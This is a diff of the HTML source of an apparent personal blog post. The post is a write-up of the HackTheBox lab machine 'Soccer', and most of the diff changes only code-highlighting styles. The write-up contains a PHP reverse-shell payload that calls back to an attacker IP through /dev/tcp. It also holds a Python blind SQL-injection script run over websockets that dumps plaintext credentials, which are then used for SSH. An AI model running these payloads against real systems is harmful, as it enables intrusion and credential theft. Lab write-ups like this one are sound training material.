@@ -34,7 +34,7 @@
 <body>
         <div class="content"><header>
 	<div class="main">
-		<a href="https://danp.bz/">Danp&#39;s Personal Blog</a>
+		<a href="https://danp.bz">Danp&#39;s Personal Blog</a>
 	</div>
 	<nav>
 		
@@ -47,7 +47,7 @@
 		<a href="/tags">Tags</a>
 		
 		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
-		<script src="https://danp.bz/js/themetoggle.js"></script>
+		<script src="https://danp.bzjs/themetoggle.js"></script>
 		
 	</nav>
 </header>
@@ -96,54 +96,54 @@
 <li>Get root</li>
 </ol>
 <h1 id="nmap">Nmap</h1>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~|⇒ nmap -sV 10.10.11.194
-</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-05-27 22:53 -03
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.194
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.091s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~|⇒ nmap -sV 10.10.11.194
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 ( https://nmap.org ) at 2023-05-27 22:53 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#fb660a;font-weight:bold">for</span> 10.10.11.194
+</span></span><span style="display:flex;"><span>Host is up (0.091s latency).
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#0086f7;font-weight:bold">997</span> closed tcp ports (conn-refused)
 </span></span><span style="display:flex;"><span>PORT     STATE SERVICE         VERSION
-</span></span><span style="display:flex;"><span>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>80/tcp   open  http            nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>80/tcp   open  http            nginx 1.18.0 (Ubuntu)
 </span></span><span style="display:flex;"><span>9091/tcp open  xmltec-xmlmail?
 </span></span></code></pre></div><p><code>-sV</code>: Enumerate versions from the services</p>
 <p>Port <code>80</code> here will be our focus, since port <code>9091</code> just returns 404&rsquo;s and my initial enumeration on it returned nothing.</p>
 <h2 id="exploiting-tiny-file-manager">Exploiting tiny file manager</h2>
 <p>Accessing the http port we get redirected to <code>soccer.htb</code>, Let&rsquo;s update our <code>/etc/hosts</code> file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~|⇒  cat /etc/hosts
-</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Host Database</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># localhost is used to configure the loopback interface</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># when the system is booting.  Do not change this entry.</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">##</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~|⇒  cat /etc/hosts
+</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic">##</span>
+</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"># Host Database</span>
+</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"># localhost is used to configure the loopback interface</span>
+</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic"># when the system is booting.  Do not change this entry.</span>
+</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic">##</span>
 </span></span><span style="display:flex;"><span>127.0.0.1	localhost
 </span></span><span style="display:flex;"><span>255.255.255.255	broadcasthost
 </span></span><span style="display:flex;"><span>::1             localhost
 </span></span><span style="display:flex;"><span>10.10.11.194    soccer.htb
 </span></span></code></pre></div><p><img src="/soccer-img/Soccer_-_Index.png" alt="img2"></p>
 <p>The website is basically a static page and does not tell us much, my next step was to try to enumerate some hidden directories</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~|⇒  ~/go/bin/gobuster dir -w ~/Documents/tools/SecLists/Discovery/Web-Content/big.txt -u http://soccer.htb
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~|⇒  ~/go/bin/gobuster dir -w ~/Documents/tools/SecLists/Discovery/Web-Content/big.txt -u http://soccer.htb
+</span></span><span style="display:flex;"><span>===============================================================
 </span></span><span style="display:flex;"><span>Gobuster v3.5
-</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://soccer.htb
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /Users/danp/Documents/tools/SecLists/Discovery/Web-Content/big.txt
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.5
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>2023/05/27 23:06:03 Starting gobuster in directory enumeration mode
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>/.htpasswd            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/.htaccess            <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 162<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>/tiny                 <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 178<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://soccer.htb/tiny/<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">20434</span> / <span style="color:#ae81ff">20477</span> <span style="color:#f92672">(</span>99.79%<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>2023/05/27 23:09:17 Finished
-</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:                     http://soccer.htb
+</span></span><span style="display:flex;"><span>[+] Method:                  GET
+</span></span><span style="display:flex;"><span>[+] Threads:                 <span style="color:#0086f7;font-weight:bold">10</span>
+</span></span><span style="display:flex;"><span>[+] Wordlist:                /Users/danp/Documents/tools/SecLists/Discovery/Web-Content/big.txt
+</span></span><span style="display:flex;"><span>[+] Negative Status codes:   <span style="color:#0086f7;font-weight:bold">404</span>
+</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.5
+</span></span><span style="display:flex;"><span>[+] Timeout:                 <span style="color:#fb660a">10s</span>
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>2023/05/27 23:06:03 Starting gobuster in directory enumeration <span style="color:#fb660a">mode</span>
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/.htpasswd            (Status: 403) [Size: 162]
+</span></span><span style="display:flex;"><span>/.htaccess            (Status: 403) [Size: 162]
+</span></span><span style="display:flex;"><span>/tiny                 (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/]
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#0086f7;font-weight:bold">20434</span> / <span style="color:#0086f7;font-weight:bold">20477</span> (99.79%)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>2023/05/27 23:09:17 <span style="color:#fb660a">Finished</span>
+</span></span><span style="display:flex;"><span>===============================================================
 </span></span></code></pre></div><p><img src="/soccer-img/Tiny_File_Manager.png" alt="img3"></p>
 <p>According to the official <a href="https://github.com/prasathmani/tinyfilemanager">Github</a> page:</p>
 <blockquote>
@@ -167,12 +167,12 @@
 <p><strong>Check out this <a href="https://www.redhat.com/sysadmin/linux-file-permissions-explained">article</a> on Linux permissions</strong></p>
 <p><img src="/soccer-img/Tiny_File_Manager-permissions2.png" alt="img6"></p>
 <p>We can create a php file that simply pops a shell in our machine</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>&lt;?php
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#39;bash -c &#34;sh -i &gt;&amp; /dev/tcp/10.10.14.14/9001 0&gt;&amp;1&#34;&#39;</span>)
+</span></span><span style="display:flex;"><span>shell_exec(<span style="color:#0086d2">&#39;bash -c &#34;sh -i &gt;&amp; /dev/tcp/10.10.14.14/9001 0&gt;&amp;1&#34;&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>Let&rsquo;s upload it</p>
+</span></span><span style="display:flex;"><span><span style="color:#ff0007;background-color:#0f140f;font-weight:bold;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><p>Let&rsquo;s upload it</p>
 <p><img src="/soccer-img/Tiny_File_Manager-fileuploads.png" alt="img7"></p>
 <p>now, we can run it by going to <code>/tiny/uploads/shell.php</code></p>
 <p><img src="/soccer-img/reverse-shell.png" alt="img8"></p>
@@ -198,7 +198,7 @@
 <li>Run it</li>
 </ol>
 <p>The <code>Network Information</code> part of Linpeas shows us something interesting</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>══════════════════════════════╣ Network Information ╠══════════════════════════════
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>══════════════════════════════╣ Network Information ╠══════════════════════════════
 </span></span><span style="display:flex;"><span>                              ╚═════════════════════╝
 </span></span><span style="display:flex;"><span>╔══════════╣ Hostname, hosts and DNS
 </span></span><span style="display:flex;"><span>soccer
@@ -222,42 +222,42 @@
 <p>With the payload <code>1 or 1=1</code> we see the confirmation our tests, we have a boolean based SQL Injection.</p>
 <p>Since it is using websockets, we cannot send the request directly into <code>sqlmap</code> by default. Let&rsquo;s create an script to exploit it our way :-)</p>
 <p>(At the end we exploit it with sqlmap in two ways, this is just for practice)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> websocket <span style="color:#f92672">import</span> create_connection
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">from</span> websocket <span style="color:#fb660a;font-weight:bold">import</span> create_connection
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_payload</span>(ws, payload, position, offset):
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Dump databases</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#payload = f&#39;1 or (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT {offset},1),{position},1))) = {payload}--&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Dump soccer_db</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#payload = f&#39;1 or (ascii(substr((SELECT table_name FROM information_schema.TABLES WHERE table_schema=\&#39;soccer_db\&#39; LIMIT {offset},1),{position},1))) = {payload}--&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Dump Columns from accounts table</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#payload = f&#39;1 or (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\&#39;accounts\&#39; LIMIT {offset},1),{position},1))) = {payload}--&#39;</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#Dump Data</span>
-</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;1 or (ascii(substr((SELECT HOST FROM accounts LIMIT </span><span style="color:#e6db74">{</span>offset<span style="color:#e6db74">}</span><span style="color:#e6db74">,1),</span><span style="color:#e6db74">{</span>position<span style="color:#e6db74">}</span><span style="color:#e6db74">,1))) = </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">--&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">def</span> <span style="color:#ff0086;font-weight:bold">send_payload</span>(ws, payload, position, offset):
+</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic"># Dump databases</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic">#payload = f&#39;1 or (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT {offset},1),{position},1))) = {payload}--&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic"># Dump soccer_db</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic">#payload = f&#39;1 or (ascii(substr((SELECT table_name FROM information_schema.TABLES WHERE table_schema=\&#39;soccer_db\&#39; LIMIT {offset},1),{position},1))) = {payload}--&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic"># Dump Columns from accounts table</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic">#payload = f&#39;1 or (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\&#39;accounts\&#39; LIMIT {offset},1),{position},1))) = {payload}--&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;background-color:#0f140f;font-style:italic">#Dump Data</span>
+</span></span><span style="display:flex;"><span>    payload = <span style="color:#0086d2">f</span><span style="color:#0086d2">&#39;1 or (ascii(substr((SELECT HOST FROM accounts LIMIT </span><span style="color:#0086d2">{</span>offset<span style="color:#0086d2">}</span><span style="color:#0086d2">,1),</span><span style="color:#0086d2">{</span>position<span style="color:#0086d2">}</span><span style="color:#0086d2">,1))) = </span><span style="color:#0086d2">{</span>payload<span style="color:#0086d2">}</span><span style="color:#0086d2">--&#39;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    ws<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;{&#34;id&#34;: &#34;&#39;</span><span style="color:#f92672">+</span>payload<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&#34;}&#39;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ws<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>    ws.send(<span style="color:#0086d2">&#39;{&#34;id&#34;: &#34;&#39;</span>+payload+<span style="color:#0086d2">&#39;&#34;}&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">return</span> ws.recv()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
-</span></span><span style="display:flex;"><span>    URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ws://soccer.htb:9091/&#39;</span>
-</span></span><span style="display:flex;"><span>    ws <span style="color:#f92672">=</span> create_connection(URL)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;============ Start Dumping Info ============&#34;</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> r <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
-</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;&#34;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> k <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>):
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">127</span>):
-</span></span><span style="display:flex;"><span>                response <span style="color:#f92672">=</span> send_payload(ws, i, k, r)
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Ticket Exists&#34;</span> <span style="color:#f92672">in</span> response:
-</span></span><span style="display:flex;"><span>                    print(chr(i), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">#print(chr(i))</span>
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">def</span> <span style="color:#ff0086;font-weight:bold">main</span>():
+</span></span><span style="display:flex;"><span>    URL = <span style="color:#0086d2">&#39;ws://soccer.htb:9091/&#39;</span>
+</span></span><span style="display:flex;"><span>    ws = create_connection(URL)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#0086d2">&#34;============ Start Dumping Info ============&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#fb660a;font-weight:bold">for</span> r in range(<span style="color:#0086f7;font-weight:bold">10</span>):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#0086d2">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#fb660a;font-weight:bold">for</span> k in range(<span style="color:#0086f7;font-weight:bold">1</span>, <span style="color:#0086f7;font-weight:bold">20</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#fb660a;font-weight:bold">for</span> i in range(<span style="color:#0086f7;font-weight:bold">33</span>, <span style="color:#0086f7;font-weight:bold">127</span>):
+</span></span><span style="display:flex;"><span>                response = send_payload(ws, i, k, r)
+</span></span><span style="display:flex;"><span>                <span style="color:#fb660a;font-weight:bold">if</span> <span style="color:#0086d2">&#34;Ticket Exists&#34;</span> in response:
+</span></span><span style="display:flex;"><span>                    print(chr(i), end=<span style="color:#0086d2">&#39;&#39;</span>, flush=<span style="color:#fb660a;font-weight:bold">True</span>)
+</span></span><span style="display:flex;"><span>                    <span style="color:#080;background-color:#0f140f;font-style:italic">#print(chr(i))</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#fb660a;font-weight:bold">break</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
-</span></span><span style="display:flex;"><span>    main()<span style="color:#f92672">%</span>
+</span></span><span style="display:flex;"><span><span style="color:#fb660a;font-weight:bold">if</span> __name__ == <span style="color:#0086d2">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()%
 </span></span></code></pre></div><p>Before we are able to extract any user&rsquo;s data, we have to find how they&rsquo;re being stored inside the database. The script has all the payloads I used to dump the information I needed, let&rsquo;s run one by one.</p>
 <p>The first step is to discover the database name, the payload for that is:</p>
 <p><code>payload = f'1 or (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT {offset},1),{position},1))) = {payload}--'</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 websocket-sqlinjection.py
-</span></span><span style="display:flex;"><span><span style="color:#f92672">============</span> Start Dumping Info <span style="color:#f92672">============</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 websocket-sqlinjection.py
+</span></span><span style="display:flex;"><span>============ Start Dumping <span style="color:#fb660a">Info</span> ============
 </span></span><span style="display:flex;"><span>mysql
 </span></span><span style="display:flex;"><span>information_schema
 </span></span><span style="display:flex;"><span>performance_schema
@@ -265,13 +265,13 @@
 </span></span><span style="display:flex;"><span>soccer_db
 </span></span></code></pre></div><p>We discover the database <code>soccer_db</code>, now let&rsquo;s find out its tables:</p>
 <p><code>payload = f'1 or (ascii(substr((SELECT table_name FROM information_schema.TABLES WHERE table_schema=\'soccer_db\' LIMIT {offset},1),{position},1))) = {payload}--'</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 websocket-sqlinjection.py
-</span></span><span style="display:flex;"><span><span style="color:#f92672">============</span> Start Dumping Info <span style="color:#f92672">============</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 websocket-sqlinjection.py
+</span></span><span style="display:flex;"><span>============ Start Dumping <span style="color:#fb660a">Info</span> ============
 </span></span><span style="display:flex;"><span>accounts
 </span></span></code></pre></div><p>The <strong>accounts</strong> table is what we want, We could guess that username and password are the fields we must dump, but let&rsquo;s dump the column&rsquo;s names too just to make sure we are not missing anything</p>
 <p><code>payload = f'1 or (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=\'accounts\' LIMIT {offset},1),{position},1))) = {payload}--'</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 websocket-sqlinjection.py
-</span></span><span style="display:flex;"><span><span style="color:#f92672">============</span> Start Dumping Info <span style="color:#f92672">============</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 websocket-sqlinjection.py
+</span></span><span style="display:flex;"><span>============ Start Dumping <span style="color:#fb660a">Info</span> ============
 </span></span><span style="display:flex;"><span>CURRENT_CONNECTIONS
 </span></span><span style="display:flex;"><span>HOST
 </span></span><span style="display:flex;"><span>MAX_SESSION_CONTROL
@@ -284,26 +284,26 @@
 </span></span><span style="display:flex;"><span>username
 </span></span></code></pre></div><p>The next payload extracts the users from the accounts table:</p>
 <p><code>payload = f'1 or (ascii(substr((SELECT username FROM accounts LIMIT {offset},1),{position},1))) = {payload}--'</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 websocket-sqlinjection.py
-</span></span><span style="display:flex;"><span><span style="color:#f92672">============</span> Start Dumping Info <span style="color:#f92672">============</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 websocket-sqlinjection.py
+</span></span><span style="display:flex;"><span>============ Start Dumping <span style="color:#fb660a">Info</span> ============
 </span></span><span style="display:flex;"><span>player
 </span></span></code></pre></div><p>Now the passwords:</p>
 <p><code>payload = f'1 or (ascii(substr((SELECT password FROM accounts LIMIT {offset},1),{position},1))) = {payload}--'</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 websocket-sqlinjection.py
-</span></span><span style="display:flex;"><span><span style="color:#f92672">============</span> Start Dumping Info <span style="color:#f92672">============</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  python3 websocket-sqlinjection.py
+</span></span><span style="display:flex;"><span>============ Start Dumping <span style="color:#fb660a">Info</span> ============
 </span></span><span style="display:flex;"><span>PlayerOftheMatch2022
 </span></span></code></pre></div><p>We find the credentials for player user: <code>player:PlayerOftheMatch2022</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  ssh player@soccer.htb
-</span></span><span style="display:flex;"><span>player@soccer.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
-</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.5 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-135-generic x86_64<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>danp@local:~/Documents/HackTheBox/Soccer|⇒  ssh player@soccer.htb
+</span></span><span style="display:flex;"><span>player@soccer.htb&#39;s password:
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
 </span></span><span style="display:flex;"><span>          ..........
-</span></span><span style="display:flex;"><span>Last login: Mon May <span style="color:#ae81ff">29</span> 19:13:05 <span style="color:#ae81ff">2023</span> from 10.10.14.14
+</span></span><span style="display:flex;"><span>Last login: Mon May <span style="color:#0086f7;font-weight:bold">29</span> 19:13:05 <span style="color:#0086f7;font-weight:bold">2023</span> from 10.10.14.14
 </span></span><span style="display:flex;"><span>player@soccer:~$ cat user.txt
 </span></span><span style="display:flex;"><span>daba77&lt;redacted&gt;db3e
 </span></span></code></pre></div><h1 id="privilage-escalation-with-doas--dstat">Privilage Escalation with doas + dstat</h1>
 <p>Our focus now, is to figure out what the <code>player</code> can do that <code>www-data</code> could not. Let&rsquo;s run Linpeas again with that in mind.</p>
 <p>Paying close attention to the <strong>Software Information</strong> part, one binary caught my attention</p>
